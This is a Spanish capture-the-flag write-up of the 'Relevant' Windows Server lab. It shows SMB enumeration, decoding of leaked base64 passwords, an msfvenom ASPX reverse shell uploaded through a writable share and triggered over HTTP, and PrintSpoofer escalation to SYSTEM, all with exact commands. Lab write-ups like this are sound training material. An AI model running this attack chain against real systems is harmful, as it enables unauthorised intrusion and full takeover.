# Relevant

**Autor**: Asier González

Nota: En esta máquina se especifica que no se use Metasploit.

## Reconocimiento

Empiezo con un nmap para ver los puertos abiertos:
`nmap -sC -sV -O -Pn -p- -T4 IP`

Los puertos encontrados:

- 80 -> Con un IIS Microsoft-IIS/10.0
- 135 -> RPC
- 139 -> Samba
- 445 -> Samba
- 3389 -> RDP
- 49663
- 49666
- 49667

- Microsoft Windows Server 2016 Standard 14393

![nmap](images/nmap.png)


## Enumeración

Procedo con samba, intento conseguir los shares y cosas interesantes:
`smbclient -L //IP -N`

![smbclient](images/smbclient.png)

Encuentro un share llamado 'nt4wrksv' que parece interesante, conecto y procedo a listar su contenido:
`smbclient //IP/nt4wrksv -N`

Hago un `ls` y veo un archivo llamado `passwords.txt`, lo descargo con `get passwords.txt`

![smbclient](images/smbclient2.png)

![passwords](images/passwords.png)

Intento descifrar los hashes, voy a Cyberchef y voy probando a ver si hay suerte con alguno. Por suerte, los hashes están en base64 por lo que en la primera opción consigo descifrarlos.

- Bob - !P@$$W0rD!123
- Bill - Juw4nnaM4n420696969!$$$

![hashes](images/hashes.png)

Tras usar las credenciales para conectar por smbclient, compruebo que ninguno tiene privilegios de nada.

Por lo que decido mirar los servicios web con más detalle.

La IP normal nos lleva a la pagina default de IIS.

Pero hay 3 puertos interesantes normalmente asociados a backend:

- 49663
- 49666
- 49667

De los cuales solo funciona el 49663.

Dirsearch a ese puerto: 
`dirsearch -u http://IP:49663/ -e -x 400,401,403,404,500 -r -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
`

Encontramos un directorio llamado 'nt4wrksv' que coincide con lo el share que vimos antes.

![dirsearch](images/dirsearch.png)


Si vamos a esa direccion: ip/nt4wrksv/ podemos comprobar que funciona pero no nos muestra nada, pero recordando cuando entramos con `smbclient` vimos que habia un archivo llamado `passwords.txt`. Por lo que intentamos acceder a el:

`http://IP:49663/nt4wrksv/passwords.txt`

Y efectivamente podemos ver el contenido del archivo directamente desde el navegador.

![passwords-web](images/passwords-web.png)

Recordemos que tenemos acceso con ese usuario mediante `smbclient` sin credenciales. Por lo que podemos intentar subir un archivo para ver si hay algun tipo de vulnerabilidad de RCE.

Resultado positivo podemos subir archivos a ese directorio.

![test](images/test.png)


## Explotación

Procedo a crear un payload con msfvenom para obtener una reverse shell:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA IP LPORT=4445 -f aspx -o asier.aspx`

![venom](images/venom.png)

Uso el comando `nc -lvnp 4445` para escuchar en el puerto 4445 y espero a que se ejecute el payload.

Subimos el archivo a la carpeta nt4wrksv:
`smbclient //IP/nt4wrksv -N`
`put asier.aspx`

![putpayload](images/putpayload.png)

Ahora solo queda ejecutar el payload desde el navegador:
`http://IP:49663/nt4wrksv/asier.aspx`

Y obtenemos una shell, con el usuario "iis apppool\defaultapppool".

![shell](images/shell.png)


## Escalada de privilegios

Si miramos nuestros privilegios podemos observar que tenemos aceso al "SeImpersonatePrivilege".

![privileges](images/privileges.png)

Ahora podemos ir a la carpeta inetpub\wwwroot y vemos que esta el DIR de nt4wrksv.

`cd C:\inetpub\wwwroot\nt4wrksv`

Ahora podemos usar tambien este DIR para subir un payload que nos permita escalar privilegios.

Descargo PrintSpoofer:

`https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`

Lo subimos mediante smbclient:

`smbclient //IP/nt4wrksv -N`
`put PrintSpoofer64.exe`

y lo ejecutamos en la maquina victima:

`PrintSpoofer64.exe -i -c cmd`


![printspoofer](images/printspoofer.png)


## Resultado

Se nos abre una cmd con privilegios de SYSTEM.

![root](images/root.png)
